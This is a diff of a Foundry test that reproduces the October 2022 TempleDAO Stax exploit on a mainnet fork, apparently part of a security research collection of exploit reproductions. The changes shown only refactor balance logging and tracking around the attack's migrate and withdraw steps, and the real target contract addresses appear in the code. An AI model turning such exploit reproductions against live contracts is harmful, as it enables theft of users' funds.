@@ -5,6 +5,8 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../TestHarness.sol";
 import {IERC20} from '../interfaces/IERC20.sol';
 
+import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
+
 // forge test --match-contract Exploit_TempleDAO -vvv
 /*
 On Oct 11, 2022 an attacker stole ~$2,3MM in Stax tokens from the TempleDAO Protocol.
@@ -71,20 +73,24 @@ interface IStax {
     function withdrawAll(bool claim) external; 
 }
 
-contract Exploit_TempleDAO is TestHarness {
+contract Exploit_TempleDAO is TestHarness, TokenBalanceTracker {
     IERC20 internal staxLpToken = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
     IStax internal stax = IStax(0xd2869042E12a3506100af1D192b5b04D65137941);
 
     function setUp() external {
         cheat.createSelectFork('mainnet', 15725066);
         cheat.deal(address(this), 0 ether);
+
+        addTokenToTracker(address(staxLpToken));
+        updateBalanceTracker(address(this));
+        updateBalanceTracker(address(stax));
     }
 
     function test_attack() external {
         console.log('------- INITIAL STATUS -------');
         console.log('Attacker balances');
         logBalances(address(this));
-        console.log('Stax balances');
+        console.log('Stax Pool balances');
         logBalances(address(stax));     
 
         console.log('------- STEP 1: MIGRATE -------');
@@ -95,7 +101,7 @@ contract Exploit_TempleDAO is TestHarness {
 
         console.log('Attacker balances');
         logBalances(address(this));
-        console.log('Stax balances');
+        console.log('Stax Pool balances');
         logBalances(address(stax));  
 
         console.log('------- STEP 2: WITHDRAW -------');
@@ -103,13 +109,8 @@ contract Exploit_TempleDAO is TestHarness {
         
         console.log('Attacker balances');
         logBalances(address(this));
-        console.log('Stax balances');
+        console.log('Stax Pool balances');
         logBalances(address(stax));  
-    }
-    function logBalances(address _from) internal {
-        emit log_named_decimal_uint('NATIVE TOKENS', _from.balance, 18);
-        emit log_named_decimal_uint('STAX', staxLpToken.balanceOf(_from), staxLpToken.decimals());
-        console.log('\n');
     }
 }
 
